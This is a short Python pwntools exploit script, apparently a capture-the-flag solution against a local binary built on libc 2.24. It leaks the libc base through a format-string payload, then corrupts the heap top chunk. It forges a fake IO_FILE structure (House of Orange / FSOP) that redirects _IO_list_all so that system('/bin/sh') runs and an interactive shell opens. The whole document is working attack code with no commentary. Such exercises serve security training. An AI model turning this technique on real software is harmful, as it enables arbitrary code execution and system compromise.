from pwn import*
def new(size,content):
	p.sendlineafter('size: ',str(size))
	p.sendlineafter('string: ',content)
p = process('./main')
libc = ELF('./libc-2.24.so',checksec=False)
payload = '%p%p%p%p%pLIBC%p'
payload = payload.ljust(0x2F0,'\x00')
payload += p64(0) + p64(0xD01)
new(0x2F0,payload)		#leak the libc_base
p.recvuntil('LIBC')
libc_base = int(p.recv(14),16) - 241 - libc.sym['__libc_start_main']
log.info('LIBC:\t' + hex(libc_base))
system = libc_base + libc.sym['system']
binsh=libc_base+next(libc.search('/bin/sh'))
unsorted_bins = libc_base + libc.sym['__malloc_hook'] + 0x10 + 88
IO_list_all = libc_base + libc.sym['_IO_list_all']
IO_str_jumps = libc_base + 0x3BE4C0
new(0x1000,'FMYY')
data = '\x00'*0x2F0
fake_IO_FILE  = p64(0) + p64(0x61) + p64(unsorted_bins) + p64(IO_list_all -0x10)#make the IO_list_all ->fd =main_arena+88
fake_IO_FILE += p64(0) + p64(1)
fake_IO_FILE += p64(0) + p64(binsh)
fake_IO_FILE = fake_IO_FILE.ljust(0xD8,'\x00')
fake_IO_FILE += p64(IO_str_jumps -8)
fake_IO_FILE += p64(0) + p64(system)
data += fake_IO_FILE
new(0x2F0,data)
p.sendlineafter('size: ',str(0x10))
p.interactive()
